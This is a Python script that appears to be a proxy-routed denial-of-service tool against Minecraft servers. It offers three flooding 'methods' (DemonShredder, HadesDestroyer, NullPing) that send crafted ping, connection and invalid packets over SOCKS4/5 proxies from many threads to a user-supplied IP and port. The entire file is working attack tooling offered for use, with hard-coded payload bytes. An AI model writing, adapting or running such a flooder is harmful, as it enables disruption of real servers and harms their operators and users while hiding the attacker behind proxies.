#!/usr/bin/python3
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime


def build_threads(mode,thread_num,event,socks_type):
	if mode == "Flood":
		for _ in range(thread_num):
			th = threading.Thread(target = flood,args=(event,socks_type,))
			th.setDaemon(True)
			th.start()


def flood(event,socks_type):
	proxy = random.choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			s.connect((str(ip), int(port)))
			try:
				for _ in range(amplification):
					s.send(Mensaje)
			except:
				s.close()
			print ("[»] " + str(Metodo) + " | Proxy - " +str(proxy[0])+":"+str(proxy[1]))
		except:
			s.close()


def main():
	global ip
	global port
	global proxies
	global amplification
	global choice
	global opcion
	global thread_num
	global Test
	global Test2
	global Mensaje
	global Metodo
	color = '\33[31m'
	green = '\33[32m'
	white = '\33[37m'
	print(color + """
	    
	 ▄▄▄▄   ▓█████▄▄▄█████▓ ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
	▓█████▄ ▓█   ▀▓  ██▒ ▓▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
	▒██▒ ▄██▒███  ▒ ▓██░ ▒░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
	▒██░█▀  ▒▓█  ▄░ ▓██▓ ░ ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
	░▓█  ▀█▓░▒████▒ ▒██▒ ░  ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
	░▒▓███▀▒░░ ▒░ ░ ▒ ░░    ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
	▒░▒   ░  ░ ░  ░   ░      ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
	 ░    ░    ░    ░        ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
	 ░         ░  ░              ░  ░            ░ ░      ░ ░      ░  ░
	      ░                                                            

    """)
	ip = ""
	port = ""
	mode = "Flood"
	opcion = input(green + """

                  ┌──────────────────────────────────────────────┐
                  │ 1. DemonShredder - Sends PING packets        │
                  │ 2. HadesDestroyer - Sends Connection Packets │
                  │ 3. NullPing - Sends invalid packets          │
                  └──────────────────────────────────────────────┘
                    💀 » Choose your method: """)
	print("")    
	print(white + "")       
	Test = b'\x14\x00/\x0e147.135.31.1'
	Test2 = b'\x14\x00/\x0e147.135.31.175\x03\xe7\x01\x01\x00'
	PingSlapper = b'\xfe\x01\xfa\x00\x0b\x00M\x00C\x00|\x00P\x00i\x00n\x00g\x00H\x00o\x00s\x00t\x00#\x7f\x00\x0e\x001\x004\x007\x00.\x001\x003\x005\x00.\x003\x001\x00.\x001\x007\x005\x00\x00\x03\xe7'
	CPSFlooder = b'\x14\x00/\x0e147.135.31.175\x03\xe7\x02\x07\x00\x05n0s3c'
	NullPing = b'\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01AttackByLPBots'
	if (opcion == "1"):
		Mensaje = PingSlapper
		print("» Method - DemonShredder")
		Metodo = "DemonShredder"
	if (opcion == "2"):
		Mensaje = CPSFlooder
		print("» Method - HadesDestroyer")
		Metodo = "HadesDestroyer"
	if (opcion == "3"):
		Mensaje = NullPing
		print("» Method - NullPing")
		Metodo = "NullPing"
	print("")    
	ip = str(input("» Numeric IP: "))
	if ip == "":
		print("» Plese enter correct host or ip")
		sys.exit(1)
	if mode == "flood":
		pass
	port = str(input("» Puerto: "))
	if port == '':
		port = int(25565)
		print("» Default choose port 25565\r\n» Port 25565 was chosen")
	else:
		port = int(port)
	thread_num = int(input("» Threads [default: 1000]: "))
	if thread_num == "":
		thread_num = int(1000)
	choice = ""
	while choice == "":
		choice = str(input("» Socks 4 or 5? [default: 4]: ")).strip()
		if choice == "5":
			choice = "5"
		if choice != "4" and choice != "5":
			print("[»] Error TYPE_INVALID try again")
			choice = ""
		if choice == "4":
			socks_type = 4
		else:
			socks_type = 5
	if choice == "4":
		out_file = str("socks4.txt")
		if out_file == '':
			out_file = str("socks4.txt")
		else:
			out_file = str(out_file)
		proxies = open(out_file).readlines()
	elif choice == "5":
		out_file = str(input("» Socks5 Path » [default: socks5.txt]: "))
		if out_file == '':
			out_file = str("socks5.txt")
		else:
			out_file = str(out_file)
		proxies = open(out_file).readlines()
	print ("» TYPE %s // Proxies: %s" %(choice,len(proxies)))
	amplification = str(input("» Loop (How many requests per thread):"))
	if amplification == "":
		amplification = int(100)
	else:
		amplification = int(amplification)
	event = threading.Event()
	print("» Initiating Threads")
	build_threads(mode,thread_num,event,socks_type)
	event.clear()
	input("» Press enter to continue «")
	event.set()
	while True:
		try:
			time.sleep(0)
		except KeyboardInterrupt:
			break
	

if __name__ == "__main__":
	main()
